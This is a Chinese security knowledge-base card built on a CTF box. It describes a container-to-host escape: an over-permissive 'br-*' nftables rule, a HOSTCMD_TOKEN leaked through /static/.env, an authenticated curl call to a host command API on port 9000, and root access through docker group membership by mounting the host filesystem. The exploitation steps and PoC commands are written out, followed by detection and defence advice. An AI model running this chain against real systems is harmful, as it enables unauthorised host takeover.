---
id: cloud-container-docker-custom-bridge-firewall-host-command-api
title: Docker 自定义网桥 br-* 被防火墙全放行：容器经泄露 Token 调用宿主机 Host Command API
type: scenario
domain: cloud
path: cloud/container
technique: docker-br-bridge-host-api-trust
aliases:
- br-* 防火墙放行
- HostCommandAPI
- HOSTCMD_TOKEN
- .env 泄露
- 容器直达宿主机 9000
- Docker 自定义网桥信任过度
tags:
- docker
- container
- firewall
- nftables
- bridge-network
- host-api
- token-leak
- lateral-movement
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V103
  verified_at: '2026-11-05T22:24:02+08:00'
  notes: 已对照原文与8张图片核对：nftables iifname br-* accept、/static/.env泄露HOSTCMD_TOKEN、/run 401端点枚举、Host Command API以scribe执行、docker组挂载宿主根目录均与原文一致；为CTF环境，未复跑靶机。
---

## 一句话结论

宿主机防火墙对 `iifname "br-*"` 全放行时，自定义 Docker 网桥上的容器可以访问宿主机任意端口；攻击者从数据库容器取得命令执行后，用静态目录泄露的 `.env` 中 `HOSTCMD_TOKEN` 调用宿主机 9000 的 Host Command API，以宿主普通用户（docker 组）执行命令，最终通过 docker 组挂载宿主机根目录取得 root。

## 原理

- Docker 自定义网络会创建 `br-<network_id>` 网桥。案例宿主机的 nftables 入站策略为 `policy drop`，但包含：
  ```text
  iifname "br-*" accept
  ```
  该规则按接口名前缀匹配，等于放行所有自定义网桥上的全部流量。容器到宿主机网关 `172.18.0.1:9000` 的请求因此不被拦截。
- 宿主机的 Host Command API 监听 9000，只有 `POST /run`，用 `Authorization: Bearer <token>` 认证，`subprocess.run(command, shell=False)` 以 `scribe` 用户执行命令数组。`shell=False` 阻止了 `;`/`&&`/`|` 注入，但仍允许执行 PATH 中任意二进制并传入任意参数。
- 认证 Token 硬编码在 `.env`，而 `.env` 被错误部署到 Web 可访问的 `/static/` 目录：
  ```text
  HOSTCMD_TOKEN=<token>
  HOSTCMD_PORT=9000
  ```
  攻击者无需爆破即可取得 Token；`HOSTCMD` 名称与 9000 端口提示了服务用途。
- 端点枚举利用状态码差异：`/cmd`、`/exec` 返回 404，`/run` 返回 401（存在但需认证），从而定位真实端点。
- 执行用户 `scribe` 属于 `docker` 组。docker 组成员可控制 Docker daemon，等价于宿主机 root：可 `docker run -v /:/mnt/host` 挂载宿主机根目录并读取 `/root`。
- 链条：容器 RCE → 内网扫描发现宿主 9000 → 泄露 Token → Host Command API 执行命令 → docker 组逃逸。单看每一步都是“配置问题”，组合起来就是从容器到宿主机的完整突破。

## 触发条件

- 容器运行在 Docker 自定义 bridge 网络，宿主机防火墙对 `br-*`（或 `docker0`）全放行。
- 宿主机上存在仅靠静态 Token 认证的内部命令 API，且该 Token 可从 Web 静态目录、环境变量、镜像层或配置文件中获取。
- API 执行用户属于 `docker` 组、有 sudo 权限，或容器内可访问 docker.sock。
- 攻击者已在某个容器内取得命令执行（如数据库 `COPY FROM PROGRAM`、Web RCE）。

## 利用步骤

1. 在容器内确认环境与网络：
   ```bash
   cat /proc/1/cgroup
   ip addr show
   ```
2. 扫描宿主机网关与常见内部端口（案例用 fscan）：
   ```bash
   ./fscan -h 172.18.0.1
   ```
3. 发现 9000 开放后确认服务：
   ```bash
   curl -s -v http://172.18.0.1:9000/
   curl -s http://172.18.0.1:9000/health
   ```
4. 枚举端点：`/cmd`、`/exec` 返回 404，`/run` 返回 401，说明 `/run` 存在且需认证。
5. 从 `/static/.env` 或镜像/环境变量取得 `HOSTCMD_TOKEN`，调用 API：
   ```bash
   curl -s http://172.18.0.1:9000/run -X POST \
     -H "Authorization: Bearer <HOSTCMD_TOKEN>" \
     -H "Content-Type: application/json" \
     -d '{"command":["id"]}'
   ```
6. 确认执行用户与组；若属于 docker 组，挂载宿主机根目录：
   ```bash
   docker run -it --rm -v /:/mnt/host alpine:latest
   cat /mnt/host/root/root.txt
   ```
7. 授权测试中只执行 `id`、`hostname` 等无害命令，不读取真实凭据或修改宿主机。

## PoC

宿主机 nftables 规则（案例）：

```text
table inet host_firewall {
    chain input {
        type filter hook input priority filter; policy drop;
        tcp dport { 22, 80, 5432 } accept
        iifname "docker0" accept
        iifname "br-*" accept          # 关键：所有自定义网桥全放行
        iifname "lo" accept
        ct state established,related accept
        ip protocol icmp accept
    }
}
```

`.env` 泄露：

```bash
curl http://TARGET/static/.env
# HOSTCMD_TOKEN=<token>
# HOSTCMD_PORT=9000
```

Host Command API 调用：

```bash
curl -s http://172.18.0.1:9000/run -X POST \
  -H "Authorization: Bearer <HOSTCMD_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"command":["id"]}'
```

```json
{"exit_code":0,"stdout":"uid=1000(scribe) gid=1000(scribe) groups=1000(scribe),...,990(docker)","stderr":""}
```

docker 组提权：

```bash
docker run -it --rm -v /:/mnt/host alpine:latest
cat /mnt/host/root/root.txt
```

## 变体与关联

- 防火墙变体：`docker0` 全放行、`br-*` 通配、缺少 `DOCKER-USER` 链细粒度限制；也可通过 host 网络模式直接暴露。
- 内部 API 变体：命令 API、Agent API、管理面板、CI Runner；认证可能只有静态 Token、Basic Auth 或 IP 白名单缺失。
- Token 来源变体：`/static/.env`、`.git/config`、镜像层、环境变量、日志、前端 JS；`HOSTCMD` 这类命名会直接暴露用途。
- 提权变体：docker 组、docker.sock 挂载、sudo 规则、宿主 API 以 root 运行。
- 关联：`cloud-container-docker-socket-tcp-escape`（docker.sock/TCP 2375 逃逸）、`cloud-container-docker-privileged-host-disk-escape`（特权容器挂载宿主磁盘）、`pentest-privilege-escalation-postgresql-superuser-copy-from-program`（容器内初始 RCE）、`ai-security-prompt-injection-summarizer-title-system-prompt-credential-leak`（本链的凭据入口）。
- 注意：`subprocess.run(shell=False)` 虽然防 shell 注入，但不等于安全；只要能把命令数组传给 API，就能执行任意二进制。真正的边界应是 API 认证、来源限制与执行用户权限。

## 检测与防御

- 防火墙：默认 drop；不要用 `iifname "br-*" accept` 通配放行；在 `DOCKER-USER` 链按容器网段、目标端口、方向做细粒度规则，只放行业务必需流量。
- 宿主 API：绑定 `127.0.0.1` 或 Unix Socket，不要监听容器可达的网桥地址；强制强认证 + 来源 IP/身份白名单；命令执行限制可执行文件、参数与用户；高风险操作走审批。
- 凭据：`.env` 不部署到 Web 根/静态目录；Token 放密钥管理服务并定期轮换；镜像层不要包含密钥；禁止将 `HOSTCMD_*` 这类用途明显的 Token 暴露给容器。
- 权限：从 `docker` 组移除业务用户；需要容器管理的场景使用受限代理/独立账号；数据库应用用户非超级用户。
- 检测：容器访问宿主机网关非常规端口；`br-*` 接口上的入站连接；Host Command API 的 401/200 请求与异常命令数组；`.env`/静态目录被访问；docker 组用户执行 `docker run -v /:/...`；容器内 fscan/端口扫描。
- 响应：收紧防火墙、下线 Host Command API 或改为本地 Socket、轮换 Token、移除 docker 组成员、审计宿主机命令执行与容器创建记录。
- 局限：案例为 Vulnyx CTF 靶机，Token、IP、端口为靶场值；本卡未复跑靶机；实际生产还需结合 Docker 版本、nftables/iptables 后端与云网络策略验证。
